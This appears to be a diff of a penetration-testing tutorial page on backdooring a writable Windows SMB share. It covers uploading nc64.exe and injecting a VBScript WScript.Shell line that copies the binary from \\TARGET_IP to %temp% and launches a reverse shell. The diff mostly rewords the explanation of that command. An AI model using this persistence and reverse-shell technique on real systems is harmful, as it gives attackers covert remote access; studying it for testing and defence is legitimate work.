@@ -6,6 +6,10 @@
 
 {% embed url="https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/createobject-function" %}
 
+2. `Wscript.Shell` object
+
+{% embed url="https://ss64.com/vb/shell.html" %}
+
 2. `Run` method
 
 {% embed url="https://www.vbsedit.com/html/6f28899c-d653-4555-8a59-49640b0e32ea.asp" %}
@@ -30,15 +34,17 @@ If the share is writable by anyone (or at least our compromised account), we can
 
 ### (1) Backdoor via `.vbs` scripts
 
-Given that we have found a VBS (`.vbs` ) script running hosted on the share, we can inject a malicious code into script to provide ourselves with a backdoor.
+Given that we have found a VBS (`.vbs` ) script running hosted on the share, we can inject a malicious code into the found script, to provide ourselves with a backdoor.
 
 **Step 1**
 
-First, we have to upload a binary (such as `nc64.exe` ) that will aid us in creating the backdoor. This can be achieved using [smbclient](https://jarrettgxz-sec.gitbook.io/networking-concepts/networking-tools/miscellaneous/smbclient).
+First, we have to upload a binary (such as `nc64.exe` ) to the share. This will aid us in creating the backdoor. This can be achieved using [smbclient](https://jarrettgxz-sec.gitbook.io/networking-concepts/networking-tools/miscellaneous/smbclient).
 
 **Step 2**
 
-Next, we can inject the malicious in the existing script. Assuming that the writable share is at `\\TARGET_IP\writable_share` .
+Next, we can inject the malicious commands in the existing script.
+
+> The inserted command assumes that the writable share is hosted at `\\TARGET_IP\writable_share` .
 
 {% code overflow="wrap" %}
 ```visual-basic
@@ -46,13 +52,13 @@ CreateObject("WScript.Shell").Run "cmd.exe /c copy /y \\TARGET_IP\writable_share
 ```
 {% endcode %}
 
-Essentially, this command executes a command using  `cmd.exe` which calls the `copy` command to copy the uploaded `nc64.exe` binary (uploaded to share) to the `%temp%` directory, before executing a reverse shell that provides us a backdoor to the system.
+The following outlines the main steps:
 
-* the `/y` flag provided to `copy` means
+**(1)** Create a new [Wscript.Shell object](https://ss64.com/vb/shell.html) and run an external command using the [`Run`](https://ss64.com/vb/run.html)  method
 
-> Suppresses prompting to confirm that you want to overwrite an existing destination file.
+* the _Wscript.Shell_ object provides access to the OS shell methods
 
-According to this [page](https://www.vbsedit.com/html/6f28899c-d653-4555-8a59-49640b0e32ea.asp), the following describes the last 2 values provided to the `Run` method:
+According to this [page](https://www.vbsedit.com/html/6f28899c-d653-4555-8a59-49640b0e32ea.asp), the following describes the last 2 values provided to the `Run` method. In our example, the values are `0, True` .
 
 * `intWindowStyle`
 
@@ -65,6 +71,14 @@ value of `0` : "Hides the window and activates another window."
 > Optional. Boolean value indicating whether the script should wait for the program to finish executing before continuing to the next statement in your script.&#x20;
 
 If set to `True` , script execution halts until the program finishes.
+
+**(2)** Execute commands using `cmd.exe` , to call the `copy` command to copy the uploaded `nc64.exe` binary (uploaded to share) to the `%temp%` directory
+
+* the `/y` flag provided to `copy` is used to:
+
+> &#x20;Suppress prompting to confirm that you want to overwrite an existing destination file.
+
+**(3)** Execute a reverse shell that provides us a backdoor to the system
 
 **Step 3**
 
